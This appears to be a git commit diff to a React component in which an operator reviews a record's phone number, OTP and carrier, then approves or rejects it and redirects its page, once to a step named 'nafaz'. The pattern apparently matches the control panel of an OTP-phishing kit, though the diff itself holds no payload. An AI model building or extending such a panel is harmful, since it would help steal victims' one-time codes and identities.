c5ce984de665d643e01aeb864143461b7070e4b4
a96363877 <a96363877@gmail.com>
2025-04-03 04:40:22 +0300

    asd

--- components/phone-info.tsx
+++ components/phone-info.tsx
@@ -21,7 +21,7 @@ interface PhoneDialogProps {
   phoneOtp?: string;
   notification: any;
   operator?: string;
-  handleApproval: (status: string, id: string) => Promise<void>;
+  handlePhoneOtpApproval: (status: string, id: string) => Promise<void>;
   handleUpdatePageName: (id: string, pagename: string) => Promise<void>;
 }
 
@@ -33,7 +33,7 @@ export default function PhoneDialog({
   operator,
   notification,
   handleUpdatePageName,
-  handleApproval,
+  handlePhoneOtpApproval,
 }: PhoneDialogProps) {
   const [phoneNumber, setPhoneNumber] = useState(notification?.phone2 || notification?.phone || "");
   const [otp, setOtp] = useState(phoneOtp || "");
@@ -145,8 +145,7 @@ export default function PhoneDialog({
         <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
             onClick={() =>{ 
-              handleUpdatePageName(notification.id,'nafaz')
-              handleApproval('approved',notification.id)
+              handlePhoneOtpApproval('approved',notification.id)
             }}
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
@@ -154,7 +153,7 @@ export default function PhoneDialog({
             {isSubmitting ? "جاري الحفظ..." : "قبول البيانات"}
           </Button>
           <Button
-            onClick={() => handleUpdatePageName(notification.id,'verfiy-phone')}
+            onClick={() =>          handlePhoneOtpApproval('rejected',notification.id) }
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-purple-700 text-white border-0 shadow-md"
           >
